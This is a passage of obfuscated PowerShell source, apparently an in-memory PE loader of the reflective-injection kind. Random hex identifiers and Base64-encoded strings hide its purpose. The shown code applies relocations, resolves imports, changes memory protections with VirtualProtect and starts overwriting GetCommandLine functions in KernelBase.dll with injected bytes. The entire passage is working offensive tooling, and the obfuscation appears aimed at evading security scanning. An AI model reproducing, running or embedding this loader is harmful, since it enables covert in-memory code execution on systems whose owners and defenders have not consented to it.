				-or (${b5905e299da14ea186abe1140fee1a54}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((d4dd55ea8a9b4bbf82495bf963ddcb8f (${bbdf587793764367b319a04d6eb00abe}) (${b5905e299da14ea186abe1140fee1a54}.EffectivePEHandle)) -eq $true)
		{
			${f62729f32249420fb9a8cfd6d15854c2} = eaa6a815d554449ebfc9210a329090f4 (${bbdf587793764367b319a04d6eb00abe}) (${b5905e299da14ea186abe1140fee1a54}.EffectivePEHandle)
			${63f1190cd6cc41f0b3c13f222f7c17e9} = $false
		}
		elseif ((d4dd55ea8a9b4bbf82495bf963ddcb8f (${b5905e299da14ea186abe1140fee1a54}.EffectivePEHandle) (${bbdf587793764367b319a04d6eb00abe})) -eq $true)
		{
			${f62729f32249420fb9a8cfd6d15854c2} = eaa6a815d554449ebfc9210a329090f4 (${b5905e299da14ea186abe1140fee1a54}.EffectivePEHandle) (${bbdf587793764367b319a04d6eb00abe})
		}
		[IntPtr]${52ec4327569549878db94591422a5b5f} = [IntPtr](c36a6fff11ae41aab0147e8eb916744d ([Int64]${b5905e299da14ea186abe1140fee1a54}.PEHandle) ([Int64]${b5905e299da14ea186abe1140fee1a54}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			${646df2118dbe4f619c71895a6e101bcc} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${52ec4327569549878db94591422a5b5f}, [Type]$Win32Types.IMAGE_BASE_RELOCATION)
			if (${646df2118dbe4f619c71895a6e101bcc}.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]${4eec36738adc4d0b92646e27568be566} = [IntPtr](c36a6fff11ae41aab0147e8eb916744d ([Int64]${b5905e299da14ea186abe1140fee1a54}.PEHandle) ([Int64]${646df2118dbe4f619c71895a6e101bcc}.VirtualAddress))
			${dccb69b4a4464dc1bd7dabe174b8a684} = (${646df2118dbe4f619c71895a6e101bcc}.SizeOfBlock - ${f918a1f8c04a44fca18cc70d4ba3aa9a}) / 2
			for(${becf8c3d80c34e9fbea46c736519a57b} = 0; ${becf8c3d80c34e9fbea46c736519a57b} -lt ${dccb69b4a4464dc1bd7dabe174b8a684}; ${becf8c3d80c34e9fbea46c736519a57b}++)
			{
				${e17f17f7e82745e4bff9acb1e97c9f1a} = [IntPtr](c36a6fff11ae41aab0147e8eb916744d ([IntPtr]${52ec4327569549878db94591422a5b5f}) ([Int64]${f918a1f8c04a44fca18cc70d4ba3aa9a} + (2 * ${becf8c3d80c34e9fbea46c736519a57b})))
				[UInt16]${536618be80f94db8b42d2e3b8f76811e} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${e17f17f7e82745e4bff9acb1e97c9f1a}, [Type][UInt16])
				[UInt16]${7ed449f3c370400e9cd106652de02d45} = ${536618be80f94db8b42d2e3b8f76811e} -band 0x0FFF
				[UInt16]${fbc20f5010e443e6b4949462135ddfa4} = ${536618be80f94db8b42d2e3b8f76811e} -band 0xF000
				for (${04d9d2a41de34f85b38de46697a89f4e} = 0; ${04d9d2a41de34f85b38de46697a89f4e} -lt 12; ${04d9d2a41de34f85b38de46697a89f4e}++)
				{
					${fbc20f5010e443e6b4949462135ddfa4} = [Math]::Floor(${fbc20f5010e443e6b4949462135ddfa4} / 2)
				}
				if ((${fbc20f5010e443e6b4949462135ddfa4} -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or (${fbc20f5010e443e6b4949462135ddfa4} -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]${7864033f620c49d7884b797361f13224} = [IntPtr](c36a6fff11ae41aab0147e8eb916744d ([Int64]${4eec36738adc4d0b92646e27568be566}) ([Int64]${7ed449f3c370400e9cd106652de02d45}))
					[IntPtr]${8caa10f9a15e4343bc805d4ca449bb2f} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${7864033f620c49d7884b797361f13224}, [Type][IntPtr])
					if (${63f1190cd6cc41f0b3c13f222f7c17e9} -eq $true)
					{
						[IntPtr]${8caa10f9a15e4343bc805d4ca449bb2f} = [IntPtr](c36a6fff11ae41aab0147e8eb916744d ([Int64]${8caa10f9a15e4343bc805d4ca449bb2f}) (${f62729f32249420fb9a8cfd6d15854c2}))
					}
					else
					{
						[IntPtr]${8caa10f9a15e4343bc805d4ca449bb2f} = [IntPtr](eaa6a815d554449ebfc9210a329090f4 ([Int64]${8caa10f9a15e4343bc805d4ca449bb2f}) (${f62729f32249420fb9a8cfd6d15854c2}))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${8caa10f9a15e4343bc805d4ca449bb2f}, ${7864033f620c49d7884b797361f13224}, $false) | Out-Null
				}
				elseif (${fbc20f5010e443e6b4949462135ddfa4} -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIABmAG8AdQBuAGQALAAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIAB2AGEAbAB1AGUAOgAgACQAewBmAGIAYwAyADAAZgA1ADAAMQAwAGUANAA0ADMAZQA2AGIANAA5ADQAOQA0ADYAMgAxADMANQBkAGQAZgBhADQAfQAsACAAcgBlAGwAbwBjAGEAdABpAG8AbgBpAG4AZgBvADoAIAAkAHsANQAzADYANgAxADgAYgBlADgAMABmADkANABkAGIAOABiADQAMgBkADIAZQAzAGIAOABmADcANgA4ADEAMQBlAH0A')))
				}
			}
			${52ec4327569549878db94591422a5b5f} = [IntPtr](c36a6fff11ae41aab0147e8eb916744d ([Int64]${52ec4327569549878db94591422a5b5f}) ([Int64]${646df2118dbe4f619c71895a6e101bcc}.SizeOfBlock))
		}
	}
	Function bb9212d45c4b468f830c0dd3e0e21de4
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${b5905e299da14ea186abe1140fee1a54},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		${b8098c5a8297473498a6b72001bbfcf1}
		)
		${3df75c88c87d449581d2b42e447373e5} = $false
		if (${b5905e299da14ea186abe1140fee1a54}.PEHandle -ne ${b5905e299da14ea186abe1140fee1a54}.EffectivePEHandle)
		{
			${3df75c88c87d449581d2b42e447373e5} = $true
		}
		if (${b5905e299da14ea186abe1140fee1a54}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${7a0a6210726b4ffbaef8596efca04a5c} = c36a6fff11ae41aab0147e8eb916744d ([Int64]${b5905e299da14ea186abe1140fee1a54}.PEHandle) ([Int64]${b5905e299da14ea186abe1140fee1a54}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${a5b884a44e8c42c3b6549db81bb49aa5} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${7a0a6210726b4ffbaef8596efca04a5c}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				if (${a5b884a44e8c42c3b6549db81bb49aa5}.Characteristics -eq 0 `
						-and ${a5b884a44e8c42c3b6549db81bb49aa5}.FirstThunk -eq 0 `
						-and ${a5b884a44e8c42c3b6549db81bb49aa5}.ForwarderChain -eq 0 `
						-and ${a5b884a44e8c42c3b6549db81bb49aa5}.Name -eq 0 `
						-and ${a5b884a44e8c42c3b6549db81bb49aa5}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAGkAbQBwAG8AcgB0AGkAbgBnACAARABMAEwAIABpAG0AcABvAHIAdABzAA==')))
					break
				}
				${9633455150f947168fc5b7a9e462058e} = [IntPtr]::Zero
				${c965d0379fb645cdafef727b6ddef3af} = (c36a6fff11ae41aab0147e8eb916744d ([Int64]${b5905e299da14ea186abe1140fee1a54}.PEHandle) ([Int64]${a5b884a44e8c42c3b6549db81bb49aa5}.Name))
				${b4c857b2e0d54ecf927e9431bcc43457} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${c965d0379fb645cdafef727b6ddef3af})
				if (${3df75c88c87d449581d2b42e447373e5} -eq $true)
				{
					${9633455150f947168fc5b7a9e462058e} = a54167c4509b4d4891d32a979159bc6a -b8098c5a8297473498a6b72001bbfcf1 ${b8098c5a8297473498a6b72001bbfcf1} -c965d0379fb645cdafef727b6ddef3af ${c965d0379fb645cdafef727b6ddef3af}
				}
				else
				{
					${9633455150f947168fc5b7a9e462058e} = $Win32Functions.LoadLibrary.Invoke(${b4c857b2e0d54ecf927e9431bcc43457})
				}
				if ((${9633455150f947168fc5b7a9e462058e} -eq $null) -or (${9633455150f947168fc5b7a9e462058e} -eq [IntPtr]::Zero))
				{
					throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBtAHAAbwByAHQAaQBuAGcAIABEAEwATAAsACAARABMAEwATgBhAG0AZQA6ACAAJAB7AGIANABjADgANQA3AGIAMgBlADAAZAA1ADQAZQBjAGYAOQAyADcAZQA5ADQAMwAxAGIAYwBjADQAMwA0ADUANwB9AA==')))
				}
				[IntPtr]${6a29104bef0747e5921164919d269f73} = c36a6fff11ae41aab0147e8eb916744d (${b5905e299da14ea186abe1140fee1a54}.PEHandle) (${a5b884a44e8c42c3b6549db81bb49aa5}.FirstThunk)
				[IntPtr]${c0120a45302847d1ae905f4bf4ea2013} = c36a6fff11ae41aab0147e8eb916744d (${b5905e299da14ea186abe1140fee1a54}.PEHandle) (${a5b884a44e8c42c3b6549db81bb49aa5}.Characteristics) 
				[IntPtr]${46b7d6acdfbe436f946834e74781b5f2} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${c0120a45302847d1ae905f4bf4ea2013}, [Type][IntPtr])
				while (${46b7d6acdfbe436f946834e74781b5f2} -ne [IntPtr]::Zero)
				{
                    ${e16a606a58064cb8bf4f324faf0df9ce} = $false
                    [IntPtr]${441e25486eff488787f500013f653942} = [IntPtr]::Zero
					[IntPtr]${82a6560a34d4427ca94576f3031364f4} = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]${46b7d6acdfbe436f946834e74781b5f2} -lt 0)
					{
						[IntPtr]${441e25486eff488787f500013f653942} = [IntPtr]${46b7d6acdfbe436f946834e74781b5f2} -band 0xffff 
                        ${e16a606a58064cb8bf4f324faf0df9ce} = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]${46b7d6acdfbe436f946834e74781b5f2} -lt 0)
					{
						[IntPtr]${441e25486eff488787f500013f653942} = [Int64]${46b7d6acdfbe436f946834e74781b5f2} -band 0xffff 
                        ${e16a606a58064cb8bf4f324faf0df9ce} = $true
					}
					else
					{
						[IntPtr]${ecf2f46847764a88b11a4ddd4c11c33f} = c36a6fff11ae41aab0147e8eb916744d (${b5905e299da14ea186abe1140fee1a54}.PEHandle) (${46b7d6acdfbe436f946834e74781b5f2})
						${ecf2f46847764a88b11a4ddd4c11c33f} = c36a6fff11ae41aab0147e8eb916744d ${ecf2f46847764a88b11a4ddd4c11c33f} ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						${3eabf603d3f74556b26c006c8dad674e} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${ecf2f46847764a88b11a4ddd4c11c33f})
                        ${441e25486eff488787f500013f653942} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${3eabf603d3f74556b26c006c8dad674e})
					}
					if (${3df75c88c87d449581d2b42e447373e5} -eq $true)
					{
						[IntPtr]${82a6560a34d4427ca94576f3031364f4} = e9ad1f9879a345188325161363978ac3 -b8098c5a8297473498a6b72001bbfcf1 ${b8098c5a8297473498a6b72001bbfcf1} -ed615d0b93c44407a4e40daa0f5a1b6d ${9633455150f947168fc5b7a9e462058e} -b11ed9979c314057bf90b0aa93610804 ${441e25486eff488787f500013f653942} -e16a606a58064cb8bf4f324faf0df9ce ${e16a606a58064cb8bf4f324faf0df9ce}
					}
					else
					{
				        [IntPtr]${82a6560a34d4427ca94576f3031364f4} = $Win32Functions.GetProcAddressIntPtr.Invoke(${9633455150f947168fc5b7a9e462058e}, ${441e25486eff488787f500013f653942})
					}
					if (${82a6560a34d4427ca94576f3031364f4} -eq $null -or ${82a6560a34d4427ca94576f3031364f4} -eq [IntPtr]::Zero)
					{
                        if (${e16a606a58064cb8bf4f324faf0df9ce})
                        {
                            Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABmAHUAbgBjAHQAaQBvAG4AIAByAGUAZgBlAHIAZQBuAGMAZQAgAGkAcwAgAG4AdQBsAGwALAAgAHQAaABpAHMAIABpAHMAIABhAGwAbQBvAHMAdAAgAGMAZQByAHQAYQBpAG4AbAB5ACAAYQAgAGIAdQBnACAAaQBuACAAdABoAGkAcwAgAHMAYwByAGkAcAB0AC4AIABGAHUAbgBjAHQAaQBvAG4AIABPAHIAZABpAG4AYQBsADoAIAAkAHsANAA0ADEAZQAyADUANAA4ADYAZQBmAGYANAA4ADgANwA4ADcAZgA1ADAAMAAwADEAMwBmADYANQAzADkANAAyAH0ALgAgAEQAbABsADoAIAAkAHsAYgA0AGMAOAA1ADcAYgAyAGUAMABkADUANABlAGMAZgA5ADIANwBlADkANAAzADEAYgBjAGMANAAzADQANQA3AH0A')))
                        }
                        else
                        {
						    Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABmAHUAbgBjAHQAaQBvAG4AIAByAGUAZgBlAHIAZQBuAGMAZQAgAGkAcwAgAG4AdQBsAGwALAAgAHQAaABpAHMAIABpAHMAIABhAGwAbQBvAHMAdAAgAGMAZQByAHQAYQBpAG4AbAB5ACAAYQAgAGIAdQBnACAAaQBuACAAdABoAGkAcwAgAHMAYwByAGkAcAB0AC4AIABGAHUAbgBjAHQAaQBvAG4AOgAgACQAewAzAGUAYQBiAGYANgAwADMAZAAzAGYANwA0ADUANQA2AGIAMgA2AGMAMAAwADYAYwA4AGQAYQBkADYANwA0AGUAfQAuACAARABsAGwAOgAgACQAewBiADQAYwA4ADUANwBiADIAZQAwAGQANQA0AGUAYwBmADkAMgA3AGUAOQA0ADMAMQBiAGMAYwA0ADMANAA1ADcAfQA=')))
                        }
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${82a6560a34d4427ca94576f3031364f4}, ${6a29104bef0747e5921164919d269f73}, $false)
					${6a29104bef0747e5921164919d269f73} = c36a6fff11ae41aab0147e8eb916744d ([Int64]${6a29104bef0747e5921164919d269f73}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${c0120a45302847d1ae905f4bf4ea2013} = c36a6fff11ae41aab0147e8eb916744d ([Int64]${c0120a45302847d1ae905f4bf4ea2013}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${46b7d6acdfbe436f946834e74781b5f2} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${c0120a45302847d1ae905f4bf4ea2013}, [Type][IntPtr])
                    if ((-not ${e16a606a58064cb8bf4f324faf0df9ce}) -and (${441e25486eff488787f500013f653942} -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${441e25486eff488787f500013f653942})
                        ${441e25486eff488787f500013f653942} = [IntPtr]::Zero
                    }
				}
				${7a0a6210726b4ffbaef8596efca04a5c} = c36a6fff11ae41aab0147e8eb916744d (${7a0a6210726b4ffbaef8596efca04a5c}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function c60aef8902744ff7a4b681bef942995b
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		${e18a4acf89ab4707941c58ec4d8c7e00}
		)
		${357cd453c7cb4c798e9a4a894d829825} = 0x0
		if ((${e18a4acf89ab4707941c58ec4d8c7e00} -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if ((${e18a4acf89ab4707941c58ec4d8c7e00} -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${e18a4acf89ab4707941c58ec4d8c7e00} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${357cd453c7cb4c798e9a4a894d829825} = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					${357cd453c7cb4c798e9a4a894d829825} = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if ((${e18a4acf89ab4707941c58ec4d8c7e00} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${357cd453c7cb4c798e9a4a894d829825} = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					${357cd453c7cb4c798e9a4a894d829825} = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if ((${e18a4acf89ab4707941c58ec4d8c7e00} -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${e18a4acf89ab4707941c58ec4d8c7e00} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${357cd453c7cb4c798e9a4a894d829825} = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					${357cd453c7cb4c798e9a4a894d829825} = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if ((${e18a4acf89ab4707941c58ec4d8c7e00} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${357cd453c7cb4c798e9a4a894d829825} = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					${357cd453c7cb4c798e9a4a894d829825} = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		if ((${e18a4acf89ab4707941c58ec4d8c7e00} -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			${357cd453c7cb4c798e9a4a894d829825} = ${357cd453c7cb4c798e9a4a894d829825} -bor $Win32Constants.PAGE_NOCACHE
		}
		return ${357cd453c7cb4c798e9a4a894d829825}
	}
	Function c5eaa1052d3d43308384637719b46c09
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${b5905e299da14ea186abe1140fee1a54},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		for( ${becf8c3d80c34e9fbea46c736519a57b} = 0; ${becf8c3d80c34e9fbea46c736519a57b} -lt ${b5905e299da14ea186abe1140fee1a54}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${becf8c3d80c34e9fbea46c736519a57b}++)
		{
			[IntPtr]${eabe84ac112549f3851692ee08783edf} = [IntPtr](c36a6fff11ae41aab0147e8eb916744d ([Int64]${b5905e299da14ea186abe1140fee1a54}.SectionHeaderPtr) (${becf8c3d80c34e9fbea46c736519a57b} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			${14ecf8c5dec94a688a133f47fb0633fd} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${eabe84ac112549f3851692ee08783edf}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]${8a2112e8eda84765a39a2c7112a0ac7f} = c36a6fff11ae41aab0147e8eb916744d (${b5905e299da14ea186abe1140fee1a54}.PEHandle) (${14ecf8c5dec94a688a133f47fb0633fd}.VirtualAddress)
			[UInt32]${0e14cb6323c548dabda34e287b76c3ff} = c60aef8902744ff7a4b681bef942995b ${14ecf8c5dec94a688a133f47fb0633fd}.Characteristics
			[UInt32]${16c6e6929a904fdc9e488b96f48b7480} = ${14ecf8c5dec94a688a133f47fb0633fd}.VirtualSize
			[UInt32]${b493ea0291514174ae1ea00c1112096f} = 0
			a1e9aa887dff49f193f787680e08120c -d97abdfba05048a9adf731f2568896bb $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUALQBNAGUAbQBvAHIAeQBQAHIAbwB0AGUAYwB0AGkAbwBuAEYAbABhAGcAcwA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0AA=='))) -b5905e299da14ea186abe1140fee1a54 ${b5905e299da14ea186abe1140fee1a54} -e8467a7c0eca496ebed04014d585d83a ${8a2112e8eda84765a39a2c7112a0ac7f} -acd1470f6ef3448bb8a0459bcfc8e55e ${16c6e6929a904fdc9e488b96f48b7480} | Out-Null
			${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.VirtualProtect.Invoke(${8a2112e8eda84765a39a2c7112a0ac7f}, ${16c6e6929a904fdc9e488b96f48b7480}, ${0e14cb6323c548dabda34e287b76c3ff}, [Ref]${b493ea0291514174ae1ea00c1112096f})
			if (${b252c80d481e4d599d8c2226f6c56423} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGgAYQBuAGcAZQAgAG0AZQBtAG8AcgB5ACAAcAByAG8AdABlAGMAdABpAG8AbgA=')))
			}
		}
	}
	Function b6fcf6b0d493431890cd4ea16d58c8fc
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${b5905e299da14ea186abe1140fee1a54},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		${dc4dd6aa6e944b868aa4edbd1d8c272a},
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		${cf87c75665104b0d9bce1914a6e20ded}
		)
		${8c5b17b18a504e3e83f8aa28429ee923} = @() 
		${3ff8b22ecd6e4e91a20a6c4bd8305519} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]${b493ea0291514174ae1ea00c1112096f} = 0
		[IntPtr]${e04853482a0844609e341ee78518fdf4} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		if (${e04853482a0844609e341ee78518fdf4} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyACAAaABhAG4AZABsAGUAIABuAHUAbABsAA==')))
		}
		[IntPtr]${3bb9d2b21c1144f0ba57100d011d1b5f} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAuAGQAbABsAA=='))))
		if (${3bb9d2b21c1144f0ba57100d011d1b5f} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		${c41ebb09215046f49c8358333d8e47dd} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${dc4dd6aa6e944b868aa4edbd1d8c272a})
		${f75f7f2b70ad48ff98962c41609e5564} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${dc4dd6aa6e944b868aa4edbd1d8c272a})
		[IntPtr]${50e5ac680c314ee190f2f13f6c758a57} = $Win32Functions.GetProcAddress.Invoke(${3bb9d2b21c1144f0ba57100d011d1b5f}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAEEA'))))
		[IntPtr]${dd2f5cd1593f484ab0516e98e3fcef79} = $Win32Functions.GetProcAddress.Invoke(${3bb9d2b21c1144f0ba57100d011d1b5f}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAFcA'))))
		if (${50e5ac680c314ee190f2f13f6c758a57} -eq [IntPtr]::Zero -or ${dd2f5cd1593f484ab0516e98e3fcef79} -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(b2b513762da64d59b95fcbd6d9534bf7 ${50e5ac680c314ee190f2f13f6c758a57}). GetCommandLineW: $(b2b513762da64d59b95fcbd6d9534bf7 ${dd2f5cd1593f484ab0516e98e3fcef79})"
		}
		[Byte[]]${96cec78ee78c4840907786cf6f3bd316} = @()
		if (${3ff8b22ecd6e4e91a20a6c4bd8305519} -eq 8)
		{
			${96cec78ee78c4840907786cf6f3bd316} += 0x48	
		}
		${96cec78ee78c4840907786cf6f3bd316} += 0xb8
		[Byte[]]${46261f09b8ec4df79944e1243d88aa37} = @(0xc3)
		${458a5042855b49a0b88b64dc805980e8} = ${96cec78ee78c4840907786cf6f3bd316}.Length + ${3ff8b22ecd6e4e91a20a6c4bd8305519} + ${46261f09b8ec4df79944e1243d88aa37}.Length
		${c82d56070d004ba2ba03e5bb67c9e355} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${458a5042855b49a0b88b64dc805980e8})
		${de96bc217b444e4480a61c6573581039} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${458a5042855b49a0b88b64dc805980e8})
		$Win32Functions.memcpy.Invoke(${c82d56070d004ba2ba03e5bb67c9e355}, ${50e5ac680c314ee190f2f13f6c758a57}, [UInt64]${458a5042855b49a0b88b64dc805980e8}) | Out-Null
		$Win32Functions.memcpy.Invoke(${de96bc217b444e4480a61c6573581039}, ${dd2f5cd1593f484ab0516e98e3fcef79}, [UInt64]${458a5042855b49a0b88b64dc805980e8}) | Out-Null
		${8c5b17b18a504e3e83f8aa28429ee923} += ,(${50e5ac680c314ee190f2f13f6c758a57}, ${c82d56070d004ba2ba03e5bb67c9e355}, ${458a5042855b49a0b88b64dc805980e8})
		${8c5b17b18a504e3e83f8aa28429ee923} += ,(${dd2f5cd1593f484ab0516e98e3fcef79}, ${de96bc217b444e4480a61c6573581039}, ${458a5042855b49a0b88b64dc805980e8})
		[UInt32]${b493ea0291514174ae1ea00c1112096f} = 0
		${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.VirtualProtect.Invoke(${50e5ac680c314ee190f2f13f6c758a57}, [UInt32]${458a5042855b49a0b88b64dc805980e8}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${b493ea0291514174ae1ea00c1112096f})
		if (${b252c80d481e4d599d8c2226f6c56423} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${a611991f94a94b65bcbe5c324076fb50} = ${50e5ac680c314ee190f2f13f6c758a57}
		d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${96cec78ee78c4840907786cf6f3bd316} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${a611991f94a94b65bcbe5c324076fb50}
		${a611991f94a94b65bcbe5c324076fb50} = c36a6fff11ae41aab0147e8eb916744d ${a611991f94a94b65bcbe5c324076fb50} (${96cec78ee78c4840907786cf6f3bd316}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${f75f7f2b70ad48ff98962c41609e5564}, ${a611991f94a94b65bcbe5c324076fb50}, $false)
		${a611991f94a94b65bcbe5c324076fb50} = c36a6fff11ae41aab0147e8eb916744d ${a611991f94a94b65bcbe5c324076fb50} ${3ff8b22ecd6e4e91a20a6c4bd8305519}
		d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${46261f09b8ec4df79944e1243d88aa37} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${a611991f94a94b65bcbe5c324076fb50}
		$Win32Functions.VirtualProtect.Invoke(${50e5ac680c314ee190f2f13f6c758a57}, [UInt32]${458a5042855b49a0b88b64dc805980e8}, [UInt32]${b493ea0291514174ae1ea00c1112096f}, [Ref]${b493ea0291514174ae1ea00c1112096f}) | Out-Null
		[UInt32]${b493ea0291514174ae1ea00c1112096f} = 0
		${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.VirtualProtect.Invoke(${dd2f5cd1593f484ab0516e98e3fcef79}, [UInt32]${458a5042855b49a0b88b64dc805980e8}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${b493ea0291514174ae1ea00c1112096f})
		if (${b252c80d481e4d599d8c2226f6c56423} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${a37d8a3fb0194b2f881f45d5d0f6b77e} = ${dd2f5cd1593f484ab0516e98e3fcef79}
